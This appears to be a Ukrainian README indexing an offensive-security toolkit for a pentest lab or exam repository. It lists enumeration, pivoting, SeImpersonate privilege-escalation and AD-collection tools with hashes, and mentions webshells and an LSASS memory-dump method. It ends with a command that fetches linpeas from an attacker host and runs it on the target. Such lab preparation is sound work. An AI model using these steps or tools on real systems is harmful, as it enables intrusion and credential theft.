# Tools

## linux/ — заливати на Linux-ціль
| Файл | Призначення | Коли |
|---|---|---|
| `linpeas.sh` | авто-enum привілеїв/кредів/misconfig | після першого доступу |
| `lse.sh` | linux-smart-enumeration (тихіший за linpeas) | альтернатива linpeas |
| `les.sh` | linux-exploit-suggester (kernel CVE) | якщо раптом потрібен root-вектор |
| `pspy64` | моніторинг процесів/cron **без рута** | пошук cron/сервісів інших юзерів |
| `pspy64s` | те саме, менший статичний білд | якщо pspy64 не запускається |
| `chisel` | TCP-тунель / SOCKS-проксі | пивотинг до внутрішніх сервісів |
| `ligolo-agent` | агент ligolo-ng (альтернатива chisel) | пивотинг, якщо зручніший |
| `ncat` | nc з SSL, портативний | listener/передача, якщо на цілі нема nc |
| `socat` | релеї, повний TTY | стабільний shell, port-relay |
| `bincrypter` | обфускація/пакування бінарників | допоміжне, рідко |

→ пивотинг: [pivoting](../02-workflows/pivoting-portforward.md) · enum: [post-exploitation](../01-roadmaps/post-exploitation.md)

## windows/ — заливати на Windows-ціль
| Файл | Призначення | Коли |
|---|---|---|
| `winPEASx64.exe` | авто-enum privesc/кредів/misconfig | після доступу (x64) |
| `winPEAS.bat` | те саме без .NET/коли .exe ріжеться | fallback |
| `accesschk.exe` / `accesschk64.exe` | права на сервіси/файли/реєстр (Sysinternals) | privesc: слабкі права сервісів |
| `PrintSpoofer64.exe` / `PrintSpoofer32.exe` | SeImpersonate → SYSTEM (Win10/2016-2019) | `whoami /priv`=SeImpersonate |
| `GodPotato-NET4.exe` / `GodPotato-NET35.exe` | SeImpersonate → SYSTEM (ширша сумісність, потрібен .NET) | коли PrintSpoofer не йде |
| `RunasCs.exe` / `RunasCs_net2.exe` | запуск під іншим юзером з паролем/хешем (без інтерактиву) | знайдено креди юзера |
| `SharpHound.exe` / `SharpHound.ps1` | збір даних AD для BloodHound CE | домен (з Windows-хоста) |
| `nc.exe` | netcat для Windows (listener/revshell) | старі ОС |
| `plink.exe` | SSH-клієнт PuTTY (тунелі/port-forward) | pivot з Windows |
| `wget.exe` | завантаження файлів на ціль | старі ОС |
| `whoami.exe` | якщо вбудованого бракує на старих ОС | старі ОС |

→ напрям: [windows/](../windows/README.md) · privesc-застосування: [windows/03-privesc](../windows/03-privesc.md).

### Походження, версії, SHA-256 (перевірено при завантаженні)
Завантажено з офіційних репозиторіїв/джерел. SHA-256 порахований локально; для SharpHound звірено з опублікованим `.sha256` (збіг).
| Файл | Джерело (офіційне) | Версія | SHA-256 |
|---|---|---|---|
| `winPEASx64.exe` | github.com/peass-ng/PEASS-ng (releases) | 20261109-f4fdadd7 | `32866ec9875b6992e31da39ef9ece4aa3117ae46128ff61e0ddbaf683d316f2e` |
| `winPEAS.bat` | github.com/peass-ng/PEASS-ng (releases) | 20261109-f4fdadd7 | `cd45a0db52a7a887e34622c0af501cfcd67b65267517fe9964bd2d5af2e9d1a2` |
| `accesschk.exe` | download.sysinternals.com/files/AccessChk.zip (Microsoft) | Sysinternals | `69bd46e5dba2767a63408731b0c7842b9ac37aeb67586682efce4cc51057d793` |
| `accesschk64.exe` | download.sysinternals.com/files/AccessChk.zip (Microsoft) | Sysinternals | `843b6b1d275946f2c4569169c10c50eec0968c4b2f0bed68c50e79f828fab9f3` |
| `PrintSpoofer64.exe` | github.com/itm4n/PrintSpoofer (releases) | v1.0 | `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` |
| `PrintSpoofer32.exe` | github.com/itm4n/PrintSpoofer (releases) | v1.0 | `47c9eff8142490a2c341701aab7aaebc355eed1540eed534a8317dd1e65614b2` |
| `GodPotato-NET4.exe` | github.com/BeichenDream/GodPotato (releases) | V1.20 | `9a8e9d587b570d4074f1c8317b163aa8d0c566efd88f294d9d85bc7776352a28` |
| `GodPotato-NET35.exe` | github.com/BeichenDream/GodPotato (releases) | V1.20 | `3027a212272957298bf4d32505370fa63fb162d6a6a6ec091af9d7626317a858` |
| `RunasCs.exe` | github.com/antonioCoco/RunasCs (releases) | v1.5 | `29955ba1e2193047ee5f4561445f81e218ae4de1a295f8fd296ad536bf381f17` |
| `RunasCs_net2.exe` | github.com/antonioCoco/RunasCs (releases) | v1.5 | `0ea02bb8dac24d72cee8d5fcac3e65c4f809dde226071ac273fbbd4a060ff4c8` |
| `SharpHound.exe` | github.com/SpecterOps/SharpHound (releases) | v2.17.1 | `23e7bc671921d86ce5d78e47fc5c0baafe1633cfa477637e7635fa76462c9d05` |
| `SharpHound.ps1` | github.com/SpecterOps/SharpHound (releases) | v2.17.1 | `83b964ec3848609ed7ac81ed103e0664860c86b499b3f151365a283b359f7fe9` |

> **Архітектура/сумісність:** winPEAS x64; PrintSpoofer — 64/32; GodPotato/RunasCs/SharpHound — .NET (i386-образ, працює на x64 через WoW64, потрібен відповідний .NET Framework на цілі); accesschk — 32/64.
> **SharpHound 2.17.1** збирає під **BloodHound CE**. Для **legacy BloodHound** потрібен колектор 1.x (github.com/BloodHoundAD/BloodHound/Collectors) — звіряй із версією BloodHound на Kali. Простіша альтернатива без бінаря на цілі: `bloodhound-python` з Kali.
> **Seatbelt** — у репо НЕ покладений: офіційних скомпільованих релізів немає (лише вихідний код C#, github.com/GhostPack/Seatbelt), а неперевірені community-бінарі ми не додаємо. winPEAS покриває ту саму потребу.
> **mimikatz** — не дублюємо: вже на Kali у `/usr/share/windows-resources/mimikatz` (заливати звідти). Альтернатива без mimikatz — `rundll32 comsvcs.dll MiniDump` + `pypykatz` на Kali ([windows/04-credentials](../windows/04-credentials.md#lsass)).

## webshells/ — залити на вразливий веб-сервер
`php/`, `asp/`, `jsp/`, `perl/` — готові веб-шели й reverse-shell скрипти.
Перед використанням у reverse-варіантах виставити свій IP/порт усередині файлу.
→ [webshells/revshells cheatsheet](../03-cheatsheets/webshells-revshells.md)

---

## Чого тут НЕ покладено (вже є на кожній Kali у `/usr/share`)
Великі стандартні набори — щоб не роздувати репо. Шляхи в системі:
| Ресурс | Шлях у Kali | Розмір |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | ~134 МБ |
| SecLists | `/usr/share/seclists` | ~1.9 ГБ |
| winPEAS (решта білдів) | `/usr/share/peass/winpeas/` | ~64 МБ (у репо лишили `winPEASx64.exe`+`winPEAS.bat`) |
| linpeas (усі білди) | `/usr/share/peass/linpeas/` | ~25 МБ (тут лишили тільки `linpeas.sh`) |
| mimikatz | `/usr/share/windows-resources/mimikatz` | ~2.6 МБ |
| powersploit | `/usr/share/windows-resources/powersploit` | ~5.9 МБ |

Якщо на основному етапі знадобиться щось із цього — воно вже в системі за цими шляхами.
Вибір wordlist під задачу — у [pre-game-checklist](../00-setup/pre-game-checklist.md#wordlists-перевірка-наявності-та-вибір).

## Роздача на ціль (швидко)
```bash
# на Kali, з цього каталогу:
cd tools/linux && python3 -m http.server 8000
# на цілі:
wget http://10.8.N.x:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```
Повні способи передачі (nc, /dev/tcp, scp): [file-transfer](../02-workflows/file-transfer.md).
